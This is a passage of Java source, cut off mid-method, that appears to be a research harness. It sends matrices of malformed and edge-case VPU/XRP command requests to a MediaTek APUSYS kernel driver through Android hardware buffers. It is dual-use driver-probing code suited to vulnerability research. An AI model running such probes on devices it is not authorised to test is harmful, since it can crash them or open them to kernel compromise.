        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP internal-buffer probe ===");
        System.out.println("[*] Mode: split-target ANN_VERSION request with"
            + " two native VPU buffer descriptors, matching the host"
            + " PrepareInternalCommandBuffer() code/output binding shape.");
        System.out.println("[*] Descriptor metadata mode: "
            + vpuDescriptorModeName(descriptorMode));
        System.out.println("[*] Descriptor order mode: "
            + vpuDescriptorOrderName(descriptorOrder));
        if (cmdFlags != XRP_CMD_FLAGS_INITIAL) {
            System.out.println("[*] Command flags mode: use wrapper send-state"
                + " settings[0]=0x" + Integer.toHexString(cmdFlags) + ".");
        }
        if (settingsLen != XRP_SETTINGS_LEN) {
            System.out.println("[*] Settings length mode: request+0x38=0x"
                + Integer.toHexString(settingsLen)
                + " instead of default 0x"
                + Integer.toHexString(XRP_SETTINGS_LEN) + ".");
        }
        if (outputHeaderFlag != XRP_OUTPUT_HEADER_FLAG_DEFAULT) {
            System.out.println("[*] Output header mode: output+0x10=0x"
                + Integer.toHexString(outputHeaderFlag)
                + " instead of default 0x"
                + Integer.toHexString(XRP_OUTPUT_HEADER_FLAG_DEFAULT) + ".");
        }
        if (!dispatch) {
            System.out.println("[*] Control: imports the buffers but skips"
                + " run_cmd_async.");
        }
        printXrpCaseBanner("internal two-buffer case", XRP_OP_ANN_VERSION);
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
            XRP_OP_ANN_VERSION, 20000, true, descriptorMode, cmdFlags,
            descriptorOrder, settingsLen, outputHeaderFlag);
    }

    private static void runRunCmdVpuXrpOpMatrixHardwareBufferProbe(int apusysFd,
                                                                   boolean dispatch)
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP opcode matrix ===");
        System.out.println("[*] Mode: repeated split-target IOVA probes using"
            + " a small internal-query opcode whitelist; each case keeps the"
            + " APUNN data descriptor separate from native VPU plane0 MVA.");
        if (!dispatch) {
            System.out.println("[*] Control: each case imports the buffers but"
                + " skips run_cmd_async.");
        }
        for (int i = 0; i < XRP_OP_MATRIX.length; i++) {
            XrpOpSpec spec = XRP_OP_MATRIX[i];
            printXrpCaseBanner("matrix case " + (i + 1)
                + "/" + XRP_OP_MATRIX.length, spec);
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                spec);
        }
    }

    private static void runRunCmdVpuXrpOpCaseHardwareBufferProbe(int apusysFd,
                                                                 boolean dispatch,
                                                                 XrpOpSpec spec)
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP opcode case ===");
        System.out.println("[*] Mode: single split-target IOVA probe for one"
            + " internal-query opcode shape.");
        if (!dispatch) {
            System.out.println("[*] Control: imports the buffers but skips"
                + " run_cmd_async.");
        }
        printXrpCaseBanner("single case", spec);
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
            spec, 20000);
    }

    private static void runRunCmdVpuXrpFlagsMatrixHardwareBufferProbe(
            int apusysFd, boolean dispatch) throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP flags matrix ===");
        System.out.println("[*] Mode: wrapper-data request shape with varied"
            + " settings[0] flags to test whether APUNN reads, preserves, or"
            + " overwrites the host completion bits.");
        if (!dispatch) {
            System.out.println("[*] Control: each case imports the buffers but"
                + " skips run_cmd_async.");
        }
        int[] flags = new int[] {
            XRP_CMD_FLAGS_INITIAL,
            XRP_CMD_FLAGS_COMPLETE,
            XRP_CMD_FLAGS_COMPLETE_SEND,
            XRP_CMD_FLAGS_SEND,
            XRP_CMD_FLAGS_SEND_ERROR,
        };
        for (int i = 0; i < flags.length; i++) {
            int cmdFlags = flags[i];
            System.out.println("\n[*] --- XRP flags matrix case " + (i + 1)
                + "/" + flags.length
                + ": settings[0]=0x" + Integer.toHexString(cmdFlags)
                + " completion_predicate="
                + (((cmdFlags & 0x0a) == 0x02) ? "true" : "false")
                + " time_ms=" + System.currentTimeMillis() + " ---");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 20000, true, VPU_DESC_LIBVPU,
                cmdFlags, VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                XRP_OUTPUT_HEADER_FLAG_DEFAULT, XrpSettingsShape.WRAPPER_ONE_DATA);
        }
    }

    private static void runRunCmdVpuXrpOperandOffsetMatrixHardwareBufferProbe(
            int apusysFd, boolean dispatch) throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP operand-offset matrix ===");
        System.out.println("[*] Mode: wrapper-data request shape with varied"
            + " Xtensa operation entry+0x08 operand-list offsets. Each case"
            + " relocates the output operand id to entry+0x48+operand_off.");
        if (!dispatch) {
            System.out.println("[*] Control: each case imports the buffers but"
                + " skips run_cmd_async.");
        }
        for (int i = 0; i < XRP_OP_OPERAND_OFFSET_MATRIX.length; i++) {
            XrpOpSpec spec = XRP_OP_OPERAND_OFFSET_MATRIX[i];
            System.out.println("\n[*] --- XRP operand-offset matrix case "
                + (i + 1) + "/" + XRP_OP_OPERAND_OFFSET_MATRIX.length
                + ": operand_off=0x"
                + Integer.toHexString(spec.operandListOffset)
                + " time_ms=" + System.currentTimeMillis() + " ---");
            printXrpCaseBanner("operand-offset case", spec);
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                spec, 20000, true, VPU_DESC_LIBVPU,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA);
        }
    }

    private static void printXrpCaseBanner(String prefix, XrpOpSpec spec) {
        System.out.println("\n[*] --- XRP " + prefix
            + ": " + spec.label
            + " opcode=" + spec.opcode + " name=" + spec.name
            + " inputs=" + spec.inputCount
            + " outputs=" + spec.outputCount
            + " operand_off=0x" + Integer.toHexString(spec.operandListOffset)
            + " operands=" + xrpOperandListText(spec)
            + " time_ms=" + System.currentTimeMillis() + " ---");
    }

    private static void runRunCmdVpuExecHardwareBufferProbe(int apusysFd)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd VPU full-size exec probe ===");
        System.out.println("[*] Mode: valid APUSYS command header, normal VPU"
            + " subcommand type, 0xb70 codebuf with apu_lib_apunn algo name,"
            + " flags=0, buffer_count=0. Expects real VPU hw dispatch or timeout.");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "vpu_exec_apunn", 0,
            RUN_CMD_PAYLOAD_VPU_EXEC);
    }

    private static void runOneRunCmdHardwareBufferProbe(int apusysFd, String label,
                                                        int firstU32) throws Exception {
        runOneRunCmdHardwareBufferProbe(apusysFd, label, firstU32,
            RUN_CMD_PAYLOAD_ZERO);
    }

    private static void runOneRunCmdHardwareBufferProbe(int apusysFd, String label,
                                                        int firstU32,
                                                        int payloadMode)
            throws Exception {
        System.out.println("\n[*] --- run_cmd HardwareBuffer case: " + label
            + " first_u32=0x" + Integer.toHexString(firstU32)
            + " payload_mode=" + payloadMode
            + " ---");

        android.media.ImageReader reader = null;
        android.media.ImageWriter writer = null;
        android.media.Image input = null;
        android.media.Image output = null;
        android.hardware.HardwareBuffer hb = null;
        try {
            reader = createRgbaImageReader(64, 64);
            System.out.println("[+] ImageReader created: width=" + reader.getWidth()
                + " height=" + reader.getHeight()
                + " format=" + reader.getImageFormat()
                + " hbFormat=" + reader.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(reader.getUsage()));

            writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
            System.out.println("[+] ImageWriter created: width=" + writer.getWidth()
                + " height=" + writer.getHeight()
                + " format=" + writer.getFormat()
                + " hbFormat=" + writer.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(writer.getUsage()));

            input = writer.dequeueInputImage();
            if (payloadMode == RUN_CMD_PAYLOAD_INVALID_SC) {
                fillRunCmdSubcommand(input, 0x20, 0, 0x60,
                    "invalid_sc_type20");
            } else if (payloadMode == RUN_CMD_PAYLOAD_VPU_GUARD) {
                fillRunCmdSubcommand(input, 0x03, 0x20, 0x60,
                    "vpu_guard_type3_size20");
            } else if (payloadMode == RUN_CMD_PAYLOAD_VPU_EXEC) {
                fillRunCmdVpuExec(input, "apu_lib_apunn",
                    "vpu_exec_apunn");
            } else {
                fillImageHeader(input, firstU32);
            }
            writer.queueInputImage(input);
            input = null;

            output = acquireImage(reader);
            if (output == null) {
                System.out.println("[-] ImageReader did not produce an output image");
                return;
            }

            hb = output.getHardwareBuffer();
            if (hb == null) {
                System.out.println("[-] Image.getHardwareBuffer returned null");
                return;
            }

            System.out.println("[+] Output HardwareBuffer:"
                + " width=" + optionalIntMethod(hb, "getWidth")
                + " height=" + optionalIntMethod(hb, "getHeight")
                + " format=" + optionalIntMethod(hb, "getFormat")
                + " layers=" + optionalIntMethod(hb, "getLayers")
                + " usage=" + optionalLongMethod(hb, "getUsage"));
            probeHardwareBufferParcel(apusysFd, hb, false, true, "hwb_run_" + label);
        } catch (Throwable t) {
            System.out.println("[-] run_cmd HardwareBuffer case " + label
                + " failed: " + shortThrowable(t));
        } finally {
            if (hb != null) {
                hb.close();
            }
            if (output != null) {
                output.close();
            }
            if (input != null) {
                input.close();
            }
            if (writer != null) {
                writer.close();
            }
            if (reader != null) {
                reader.close();
            }
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsWordMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] codeWords = {
            0x00000000,
            0x00002713,
            0x0000271b,
            0x504c4e30,
            0xffffffff,
        };
        for (int codeWord : codeWords) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " code-first-word case 0x"
                + Integer.toHexString(codeWord) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, codeWord);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsSizeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] descriptorSizes = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x00000004,
            0x00000005,
            0x00000006,
            0x00000007,
            0x00000008,
            0x00000009,
            0x0000000c,
            0x00000010,
            0x00000020,
            0x00000040,
            XRP_CODE_OP_SIZE,
        };
        for (int descriptorSize : descriptorSizes) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " descriptor-size case 0x"
                + Integer.toHexString(descriptorSize) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                descriptorSize, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsPriorityMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] priorities = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0xffffffff,
        };
        for (int priority : priorities) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " request-priority case 0x"
                + Integer.toHexString(priority) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, priority, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] bufferCounts = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x00000004,
            0x00000005,
            0x00000020,
        };
        for (int bufferCount : bufferCounts) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " request-buffer-count case 0x"
                + Integer.toHexString(bufferCount) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, bufferCount, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsPortMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] portIds = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x00000004,
            0x000000ff,
        };
        for (int portId : portIds) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " descriptor-port-id case 0x"
                + Integer.toHexString(portId) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, portId, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsFormatMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] formats = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x00000004,
            0x000000ff,
        };
        for (int format : formats) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " descriptor-format case 0x"
                + Integer.toHexString(format) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, format, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] planeCounts = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x00000004,
            0x000000ff,
        };
        for (int planeCount : planeCounts) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " descriptor-plane-count case 0x"
                + Integer.toHexString(planeCount) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, planeCount, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsHeightMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] heights = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x00000040,
            0xffffffff,
        };
        for (int height : heights) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " descriptor-height case 0x"
                + Integer.toHexString(height) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, height);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] operandIds = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x0000ffff,
        };
        for (int operandId : operandIds) {
            XrpOpSpec op = new XrpOpSpec(
                "ann_version_out_operand_" + Integer.toHexString(operandId),
                "XTENSA_ANN_VERSION",
                XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1,
                new int[] { operandId });
            System.out.println("\n[*] === target-code5/no-settings"
                + " output-operand-id case 0x"
                + Integer.toHexString(operandId) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpOpSpec[] specs = {
            new XrpOpSpec("ann_version_counts_0_0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 0, new int[0]),
            new XrpOpSpec("ann_version_counts_0_1_out0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }),
            new XrpOpSpec("ann_version_counts_0_2_out0_1",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 2, new int[] { 0, 1 }),
            new XrpOpSpec("ann_version_counts_1_0_in0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                1, 0, new int[] { 0 }),
            new XrpOpSpec("ann_version_counts_1_1_in0_out1",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                1, 1, new int[] { 0, 1 }),
            new XrpOpSpec("ann_version_counts_2_1_in0_1_out2",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                2, 1, new int[] { 0, 1, 2 }),
        };
        for (XrpOpSpec op : specs) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " op-shape case " + op.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpOpSpec[] specs = targetCode5NoSettingsOpcodeMatrixSpecs();
        for (XrpOpSpec op : specs) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " opcode case " + op.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, op.opcode,
                null, null, null, null, null, null, null);
        }
    }

    private static XrpOpSpec[] targetCode5NoSettingsOpcodeMatrixSpecs() {
        return new XrpOpSpec[] {
            new XrpOpSpec("get_algo_info_out0", "GET_ALGO_INFO",
                10001, 0, 1, new int[] { 0 }),
            new XrpOpSpec("local_mem_info_out0", "LOCAL_MEM_INFO",
                10002, 0, 1, new int[] { 0 }),
            new XrpOpSpec("ann_version_out0", "XTENSA_ANN_VERSION",
                10003, 0, 1, new int[] { 0 }),
            new XrpOpSpec("detailed_op_info_out0", "GET_DETAILED_OP_INFO",
                10004, 0, 1, new int[] { 0 }),
            new XrpOpSpec("unknown_10005_out0", "UNKNOWN_10005",
                10005, 0, 1, new int[] { 0 }),
            new XrpOpSpec("apu_lib_apunn_10006_out0", "APU_LIB_APUNN_10006",
                10006, 0, 1, new int[] { 0 }),
            new XrpOpSpec("apu_lib_custom_10007_out0", "APU_LIB_CUSTOM_10007",
                10007, 0, 1, new int[] { 0 }),
            new XrpOpSpec("apunn_dynamic_10008_out0", "APUNN_DYNAMIC_10008",
                10008, 0, 1, new int[] { 0 }),
            new XrpOpSpec("custom_dynamic_10009_out0", "CUSTOM_DYNAMIC_10009",
                10009, 0, 1, new int[] { 0 }),
        };
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpOpSpec[] specs = targetCode5NoSettingsOpcodeMatrixSpecs();
        for (XrpOpSpec op : specs) {
            System.out.println("\n[*] === target-settings5/no-settings"
                + " opcode case " + op.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, op.opcode,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] operandIds = {
            0x00000000,
            0x00000001,
            0x00000002,
            0x00000003,
            0x0000ffff,
        };
        for (int operandId : operandIds) {
            XrpOpSpec op = new XrpOpSpec(
                "ann_version_out_operand_" + Integer.toHexString(operandId),
                "XTENSA_ANN_VERSION",
                XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1,
                new int[] { operandId });
            System.out.println("\n[*] === target-settings5/no-settings"
                + " output-operand-id case 0x"
                + Integer.toHexString(operandId) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        for (XrpOpSpec op : XRP_OP_OPERAND_OFFSET_MATRIX) {
            System.out.println("\n[*] === target-settings5/no-settings"
                + " operand-offset case " + op.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpOpSpec[] specs = {
            new XrpOpSpec("ann_version_counts_0_0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 0, new int[0]),
            new XrpOpSpec("ann_version_counts_0_1_out0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 1, new int[] { 0 }),
            new XrpOpSpec("ann_version_counts_0_2_out0_1",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                0, 2, new int[] { 0, 1 }),
            new XrpOpSpec("ann_version_counts_1_0_in0",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                1, 0, new int[] { 0 }),
            new XrpOpSpec("ann_version_counts_1_1_in0_out1",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                1, 1, new int[] { 0, 1 }),
            new XrpOpSpec("ann_version_counts_2_1_in0_1_out2",
                "XTENSA_ANN_VERSION", XRP_OPCODE_XTENSA_ANN_VERSION,
                2, 1, new int[] { 0, 1, 2 }),
        };
        for (XrpOpSpec op : specs) {
            System.out.println("\n[*] === target-settings5/no-settings"
                + " op-shape case " + op.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] codeSizes = {
            0x00000000,
            0x00000004,
            0x00000048,
            0x000001c7,
            XRP_CODE_OP_SIZE,
            0x000001c9,
            0x00000390,
        };
        runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeCases(
            apusysFd, dispatch, codeSizes, "wrapper_one_data_code_size");
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] codeSizes = {
            0x00000000,
            0x00000004,
            0x00000008,
            0x0000000c,
            0x00000010,
            0x00000011,
            0x00000012,
            0x00000013,
            0x00000014,
            0x00000018,
            0x0000001c,
            0x00000020,
            0x0000003f,
            0x00000040,
            0x00000044,
            0x00000047,
            0x00000048,
            0x00000049,
            0x0000004c,
            0x000001c7,
            XRP_CODE_OP_SIZE,
            0x000001c9,
            0x000001ca,
            0x000001cc,
        };
        runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeCases(
            apusysFd, dispatch, codeSizes, "wrapper_one_data_code_size_range");
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] codeSizes = {
            0x00000011,
            0x00000014,
            0x0000001c,
            0x00000020,
            0x00000040,
            0x00000048,
            0x0000004c,
            0x000001c9,
        };
        runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeCases(
            apusysFd, dispatch, codeSizes, "wrapper_one_data_code_size_clean");
    }

    private static void runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeCases(
